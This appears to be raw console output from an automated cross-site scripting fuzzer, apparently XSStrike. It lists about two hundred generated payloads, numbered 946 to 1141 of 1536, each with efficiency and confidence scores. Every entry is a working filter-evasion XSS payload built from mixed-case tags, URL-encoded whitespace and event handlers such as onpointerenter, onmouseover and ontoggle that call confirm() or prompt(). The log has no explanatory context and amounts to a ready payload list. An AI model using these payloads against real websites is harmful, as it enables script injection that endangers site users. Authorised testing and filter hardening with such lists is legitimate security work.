 Payload: <a/+/oNpOinTereNTEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 946/1536 ------------------------------------------------------------
 Payload: <DETAilS%09ONPoiNtErENter%0d=%0d(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 947/1536 ------------------------------------------------------------
 Payload: <DETails/+/OntOggle+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 948/1536 ------------------------------------------------------------
 Payload: <dETAiLS%0aoNpOinTereNTeR%0d=%0d(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 949/1536 ------------------------------------------------------------
 Payload: <a/+/onPOINTeREntER+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 950/1536 ------------------------------------------------------------
 Payload: <htmL%0dONpoInteReNTEr%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 951/1536  Progress: 952/1536 ------------------------------------------------------------
 Payload: <d3v%0aoNMoUseOVer+=+[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 953/1536 ------------------------------------------------------------
 Payload: <dETAILS/+/ONToggLe%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 954/1536 ------------------------------------------------------------
 Payload: <A%0donPOinterenteR%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 955/1536  Progress: 956/1536 ------------------------------------------------------------
 Payload: <A/+/ONmouSeover%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 957/1536 ------------------------------------------------------------
 Payload: <D3V%0donPOInTErEnter%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 958/1536 ------------------------------------------------------------
 Payload: <htMl%0doNMOuseOVeR+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 959/1536 ------------------------------------------------------------
 Payload: <A%09oNmouSeovER%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 960/1536 ------------------------------------------------------------
 Payload: <DetAIlS%0aONTOGGLe%0a=%0a[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 961/1536  Progress: 962/1536 ------------------------------------------------------------
 Payload: <A%09ONMousEover%09=%09[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 963/1536 ------------------------------------------------------------
 Payload: <DetAIlS/+/ONPOINTeRenTER%09=%09confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 964/1536 ------------------------------------------------------------
 Payload: <HtmL%0aONPoINTERenTER%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 965/1536 ------------------------------------------------------------
 Payload: <D3V%09onMoUseovEr%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 966/1536  Progress: 967/1536 ------------------------------------------------------------
 Payload: <D3V%09OnmouseOVEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 968/1536 ------------------------------------------------------------
 Payload: <DETaIlS/+/ontOggle%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 969/1536 ------------------------------------------------------------
 Payload: <dETaIls%0aOnpOiNtErEnter%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 970/1536 ------------------------------------------------------------
 Payload: <htmL/+/ONpOInTerENteR%09=%09a=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 971/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONMOUSEOVeR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 972/1536 ------------------------------------------------------------
 Payload: <DetAIlS%0aONpOInTEREnTEr+=+(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 973/1536 ------------------------------------------------------------
 Payload: <A%09ONmOUSEOVER+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 974/1536 ------------------------------------------------------------
 Payload: <a%09onPOIntERentER%0d=%0d(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 975/1536 ------------------------------------------------------------
 Payload: <DEtAIlS%09ONPoInterEnteR%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 976/1536 ------------------------------------------------------------
 Payload: <a%0aoNmoUsEOVEr%09=%09(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 977/1536 ------------------------------------------------------------
 Payload: <a%0doNpoinTerEnTEr%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 978/1536 ------------------------------------------------------------
 Payload: <DETaILs%0aONpOINTerENTEr%0a=%0a(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 979/1536  Progress: 980/1536 ------------------------------------------------------------
 Payload: <Details/+/oNTOGGLe%0a=%0aa=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 981/1536 ------------------------------------------------------------
 Payload: <d3V%0aoNMoUseOveR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 982/1536 ------------------------------------------------------------
 Payload: <DETAiLS%09oNPoINteRentER%09=%09(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 983/1536 ------------------------------------------------------------
 Payload: <a/+/ONmoUsEoVeR%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 984/1536  Progress: 985/1536 ------------------------------------------------------------
 Payload: <a/+/oNmoUsEOVer%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 986/1536  Progress: 987/1536 ------------------------------------------------------------
 Payload: <d3v/+/OnmOUSeoVER%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 988/1536  Progress: 989/1536 ------------------------------------------------------------
 Payload: <a%09OnPoINTerEnteR%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 990/1536 ------------------------------------------------------------
 Payload: <HtML%0aonPOInteReNTER%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 991/1536 ------------------------------------------------------------
 Payload: <A%0aonmOUSeOvEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 992/1536 ------------------------------------------------------------
 Payload: <d3V%0dONMousEoVeR+=+[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 993/1536  Progress: 994/1536 ------------------------------------------------------------
 Payload: <a%0aoNPoINtErENter%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 995/1536 ------------------------------------------------------------
 Payload: <a%0aOnMOuseoVER%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 996/1536 ------------------------------------------------------------
 Payload: <D3V%09ONPOinTeRentEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 997/1536 ------------------------------------------------------------
 Payload: <DeTaILs/+/oNToggle%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 998/1536 ------------------------------------------------------------
 Payload: <htML%0aonpOinteRENtER+=+[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 999/1536 ------------------------------------------------------------
 Payload: <A/+/ONPoINTerentER%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1000/1536 ------------------------------------------------------------
 Payload: <a/+/onmoUsEoVer%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1001/1536 ------------------------------------------------------------
 Payload: <A%0doNmoUSeoVEr%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1002/1536 ------------------------------------------------------------
 Payload: <Details/+/ONPoINTeReNtER%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1003/1536 ------------------------------------------------------------
 Payload: <D3V%09OnpoiNTerENTER+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1004/1536 ------------------------------------------------------------
 Payload: <D3v/+/OnMOUSeOveR%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1005/1536 ------------------------------------------------------------
 Payload: <A/+/ONmOUSeOVEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1006/1536 ------------------------------------------------------------
 Payload: <A%0aONpOintEREnteR%0a=%0a(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1007/1536 ------------------------------------------------------------
 Payload: <dEtAiLS/+/OnPoiNterEnTER%0a=%0a(prompt)``// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1008/1536 ------------------------------------------------------------
 Payload: <d3V%09onpOiNTerenTer%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1009/1536 ------------------------------------------------------------
 Payload: <d3v%09onmoUsEoVer+=+(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1010/1536  Progress: 1011/1536 ------------------------------------------------------------
 Payload: <DetAIls%09oNPoiNteRentER%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1012/1536 ------------------------------------------------------------
 Payload: <Html/+/OnpOINtEreNTEr%0a=%0aa=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1013/1536  Progress: 1014/1536 ------------------------------------------------------------
 Payload: <A%0doNpoinTerenter+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1015/1536 ------------------------------------------------------------
 Payload: <A/+/oNmOusEover%0d=%0d[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1016/1536 ------------------------------------------------------------
 Payload: <DEtaIls%0aoNPoinTEREnTer+=+(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1017/1536 ------------------------------------------------------------
 Payload: <A%0donpoinTerEntER%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1018/1536 ------------------------------------------------------------
 Payload: <A%0aOnpOINtERENTER%0a=%0aa=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1019/1536 ------------------------------------------------------------
 Payload: <HtmL/+/OnMouSeover%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1020/1536 ------------------------------------------------------------
 Payload: <D3V/+/OnmOuSEoveR%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1021/1536 ------------------------------------------------------------
 Payload: <htmL/+/oNMoUSeOver%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1022/1536 ------------------------------------------------------------
 Payload: <hTMl%09onPOINTERENTer%0a=%0aconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1023/1536  Progress: 1024/1536 ------------------------------------------------------------
 Payload: <DeTAils%0aOnpoiNtEReNteR%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1025/1536 ------------------------------------------------------------
 Payload: <HTmL/+/oNpOinterenTer%09=%09confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1026/1536 ------------------------------------------------------------
 Payload: <HTml%09ONPoINTeRENTeR%0a=%0aa=prompt,a()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1027/1536 ------------------------------------------------------------
 Payload: <a%0aOnmouSeoveR+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1028/1536 ------------------------------------------------------------
 Payload: <HTmL%0donpoINtErENTEr%0a=%0aconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1029/1536  Progress: 1030/1536 ------------------------------------------------------------
 Payload: <detAiLS%09OnpOInTeReNTER+=+(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1031/1536 ------------------------------------------------------------
 Payload: <DeTAIlS%09OnToggle%09=%09(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1032/1536  Progress: 1033/1536 ------------------------------------------------------------
 Payload: <DETaILs%09oNtoGGle%09=%09[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1034/1536 ------------------------------------------------------------
 Payload: <htMl/+/ONPOinTeRenTER%0a=%0a(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1035/1536 ------------------------------------------------------------
 Payload: <a%0doNPointerEnteR+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1036/1536 ------------------------------------------------------------
 Payload: <A/+/ONPOInTErEnTEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1037/1536 ------------------------------------------------------------
 Payload: <hTML%0aOnpOINTErEnter%0d=%0d(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1038/1536 ------------------------------------------------------------
 Payload: <HTmL%09ONMouSEOVER+=+a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1039/1536  Progress: 1040/1536 ------------------------------------------------------------
 Payload: <D3V%0donmousEOvER%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1041/1536 ------------------------------------------------------------
 Payload: <a%09OnmouSeOvER%0a=%0a(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1042/1536 ------------------------------------------------------------
 Payload: <A%09OnMouseoVeR%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1043/1536 ------------------------------------------------------------
 Payload: <d3v%0donpoIntERenTeR+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1044/1536 ------------------------------------------------------------
 Payload: <a%09onmOuSeoVer%09=%09(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1045/1536 ------------------------------------------------------------
 Payload: <hTmL%0aonmouSeoVER%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1046/1536 ------------------------------------------------------------
 Payload: <deTaIls/+/onpOInTERenTeR+=+(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1047/1536 ------------------------------------------------------------
 Payload: <D3v%09onmOuseoVer+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1048/1536  Progress: 1049/1536 ------------------------------------------------------------
 Payload: <HtML/+/onmOusEOVEr%0a=%0a[8].find(confirm)%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1050/1536 ------------------------------------------------------------
 Payload: <a%0dONmoUSEOVeR+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1051/1536 ------------------------------------------------------------
 Payload: <A%09ONmOUseover%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1052/1536 ------------------------------------------------------------
 Payload: <D3V%0doNpOiNTerEnteR%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1053/1536 ------------------------------------------------------------
 Payload: <dETAiLS%0aOnpOintereNtEr+=+a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1054/1536 ------------------------------------------------------------
 Payload: <hTMl%0doNpoInteReNter%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1055/1536 ------------------------------------------------------------
 Payload: <a%09oNPOINTerEnter%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1056/1536 ------------------------------------------------------------
 Payload: <A%0dONmOUseover%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1057/1536 ------------------------------------------------------------
 Payload: <D3v/+/ONpOinTERENter+=+a=prompt,a()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1058/1536 ------------------------------------------------------------
 Payload: <dEtAIlS%09ONTogglE%0d=%0da=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1059/1536 ------------------------------------------------------------
 Payload: <D3v%09oNMoUseOveR%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1060/1536 ------------------------------------------------------------
 Payload: <a%0aOnMoUSeoVer%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1061/1536 ------------------------------------------------------------
 Payload: <a/+/OnPoiNterEntEr+=+(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1062/1536 ------------------------------------------------------------
 Payload: <DETAIls%0aONTogglE%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1063/1536  Progress: 1064/1536 ------------------------------------------------------------
 Payload: <A%0aONPoINterENTEr%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1065/1536 ------------------------------------------------------------
 Payload: <D3v%09OnmOusEoVeR+=+(prompt)``//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1066/1536 ------------------------------------------------------------
 Payload: <d3v/+/OnpOINTErEnter%09=%09[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1067/1536 ------------------------------------------------------------
 Payload: <D3V%0aOnPOINtERENtEr%09=%09a=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1068/1536 ------------------------------------------------------------
 Payload: <a/+/OnMOUsEOVer%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1069/1536 ------------------------------------------------------------
 Payload: <d3v/+/Onmouseover%0a=%0a[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1070/1536 ------------------------------------------------------------
 Payload: <DETAIlS%0doNToggLE%0d=%0d[8].find(confirm)// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1071/1536 ------------------------------------------------------------
 Payload: <D3v%09onPOiNtERenTEr%0d=%0dconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1072/1536 ------------------------------------------------------------
 Payload: <a%0donpOinTereNtEr%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1073/1536  Progress: 1074/1536 ------------------------------------------------------------
 Payload: <dEtAils%0dOnpOINTerENtER%09=%09(confirm)()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1075/1536 ------------------------------------------------------------
 Payload: <hTmL%0dONmouseoveR%0d=%0d(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1076/1536  Progress: 1077/1536 ------------------------------------------------------------
 Payload: <htML%09onpOINTErEnter%09=%09(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1078/1536 ------------------------------------------------------------
 Payload: <DeTAilS%0dOnpOINtEReNTeR+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1079/1536 ------------------------------------------------------------
 Payload: <D3v%09OnPoInTERentER%0d=%0dconfirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1080/1536 ------------------------------------------------------------
 Payload: <a%0doNmoUseovEr%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1081/1536  Progress: 1082/1536 ------------------------------------------------------------
 Payload: <htmL/+/OnpOInterEnTer%0d=%0dconfirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1083/1536 ------------------------------------------------------------
 Payload: <D3v%09OnmOUSeoveR%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1084/1536 ------------------------------------------------------------
 Payload: <detaIlS/+/onpoiNTerENTER+=+confirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1085/1536 ------------------------------------------------------------
 Payload: <A/+/OnPOIntereNTer%09=%09(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1086/1536 ------------------------------------------------------------
 Payload: <dEtAIlS%09oNTogGlE+=+a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1087/1536  Progress: 1088/1536 ------------------------------------------------------------
 Payload: <D3V%09onmousEoVER%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1089/1536 ------------------------------------------------------------
 Payload: <a%09ONpoiNteREnTER%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1090/1536 ------------------------------------------------------------
 Payload: <D3v%0aOnPOINtERENter%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1091/1536 ------------------------------------------------------------
 Payload: <A%0aoNMouSeoVeR%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1092/1536 ------------------------------------------------------------
 Payload: <DeTAiLs/+/oNpoInteRenteR+=+(prompt)``// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1093/1536 ------------------------------------------------------------
 Payload: <D3V%0doNpOinTEReNtEr%0a=%0a(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1094/1536 ------------------------------------------------------------
 Payload: <A/+/onmOUSEoVer%0a=%0a[8].find(confirm)//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1095/1536  Progress: 1096/1536 ------------------------------------------------------------
 Payload: <D3v%0donmOUSeoVer+=+a=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1097/1536 ------------------------------------------------------------
 Payload: <a%09OnMOuSeoVEr%09=%09(confirm)()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1098/1536  Progress: 1099/1536 ------------------------------------------------------------
 Payload: <A/+/OnmoUseOVer%0a=%0aconfirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1100/1536 ------------------------------------------------------------
 Payload: <d3v%09ONmOuSEOvEr+=+(confirm)()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1101/1536 ------------------------------------------------------------
 Payload: <A%0doNmOuSEOvEr%0d=%0d[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1102/1536 ------------------------------------------------------------
 Payload: <dETaiLS%0dONPoinTEreNter%0d=%0dconfirm()%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1103/1536 ------------------------------------------------------------
 Payload: <dETaiLS%0dOnPoINteREnTER+=+a=prompt,a()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1104/1536 ------------------------------------------------------------
 Payload: <hTMl%0dONMOuseoVeR+=+(prompt)``%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1105/1536 ------------------------------------------------------------
 Payload: <A/+/onPOiNtErentEr%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1106/1536 ------------------------------------------------------------
 Payload: <D3V%0aONPOINTEReNter+=+(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1107/1536 ------------------------------------------------------------
 Payload: <D3V%0dOnMouSeoVEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1108/1536 ------------------------------------------------------------
 Payload: <A%0aoNmoUseover%0a=%0aa=prompt,a()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1109/1536 ------------------------------------------------------------
 Payload: <d3v/+/oNpOINtERENter%0d=%0da=prompt,a()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1110/1536 ------------------------------------------------------------
 Payload: <D3V%0aoNpOinTEReNTER%0a=%0aconfirm()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1111/1536 ------------------------------------------------------------
 Payload: <HTMl%09OnPoInTErENtER%0d=%0d(confirm)()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1112/1536 ------------------------------------------------------------
 Payload: <a%0aOnPoInteReNtEr+=+confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1113/1536 ------------------------------------------------------------
 Payload: <d3V%0aonmOuSEover+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1114/1536 ------------------------------------------------------------
 Payload: <d3v%0dOnMoUSeOVER+=+[8].find(confirm)%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1115/1536 ------------------------------------------------------------
 Payload: <D3V/+/OnpoinTEReNTeR%09=%09(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1116/1536 ------------------------------------------------------------
 Payload: <a%09ONPointeREnter%09=%09confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1117/1536 ------------------------------------------------------------
 Payload: <a%0dONPOiNteReNTer%09=%09confirm()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1118/1536 ------------------------------------------------------------
 Payload: <D3V%0dOnMOUsEOVER+=+confirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1119/1536 ------------------------------------------------------------
 Payload: <dETAiLs%09OnPoiNtERENtEr%0a=%0a(confirm)()// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1120/1536 ------------------------------------------------------------
 Payload: <d3v%09ONMouSeOvEr%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1121/1536  Progress: 1122/1536 ------------------------------------------------------------
 Payload: <A%09onMouseover%0d=%0dconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1123/1536  Progress: 1124/1536 ------------------------------------------------------------
 Payload: <DETAiLs%09ONpoINtErenTER+=+confirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1125/1536 ------------------------------------------------------------
 Payload: <d3V/+/onPOiNTErENtEr%0d=%0d(confirm)()%0dx//v3dm0s 
 Efficiency: 93 
 Confidence: 10 
 Progress: 1126/1536 ------------------------------------------------------------
 Payload: <hTmL%0aonpOintEreNTEr+=+confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1127/1536 ------------------------------------------------------------
 Payload: <d3V%0aonpointErENtER%0d=%0d(confirm)()//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1128/1536 ------------------------------------------------------------
 Payload: <A/+/OnpOIntErEnTer%09=%09(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1129/1536 ------------------------------------------------------------
 Payload: <html/+/onpOINterEntEr%09=%09confirm()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1130/1536 ------------------------------------------------------------
 Payload: <dEtAiLs%0dOnPointEreNtEr%09=%09(prompt)``%0dx// 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1131/1536 ------------------------------------------------------------
 Payload: <Html%0donmoUSEOVer%09=%09a=prompt,a()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1132/1536 ------------------------------------------------------------
 Payload: <HtML%0doNpoINtErEnteR%0d=%0dconfirm()// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1133/1536 ------------------------------------------------------------
 Payload: <d3v%09ONPoiNterEntEr%0d=%0da=prompt,a()%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1134/1536 ------------------------------------------------------------
 Payload: <A%0aOnpointEReNTer%0d=%0d(prompt)``%0dx//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1135/1536 ------------------------------------------------------------
 Payload: <d3V%0donpoiNTeRentEr%0a=%0a(prompt)``//v3dm0s 
 Efficiency: 92 
 Confidence: 10 
 Progress: 1136/1536 ------------------------------------------------------------
 Payload: <HTml%09OnPoInTeRENTeR%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1137/1536 ------------------------------------------------------------
 Payload: <DetAilS%0dOnTOGgLE%09=%09a=prompt,a()%0dx// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1138/1536  Progress: 1139/1536 ------------------------------------------------------------
 Payload: <Html%0aonpoINTerEnTer%09=%09(prompt)``// 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1140/1536 ------------------------------------------------------------
 Payload: <a%0aOnmOUSeOveR%0a=%0aconfirm()//v3dm0s 
 Efficiency: 91 
 Confidence: 10 
 Progress: 1141/1536 ------------------------------------------------------------
 Payload: <a%0donPOiNTErEnTEr%0a=%0a(confirm)()%0dx//v3dm0s 
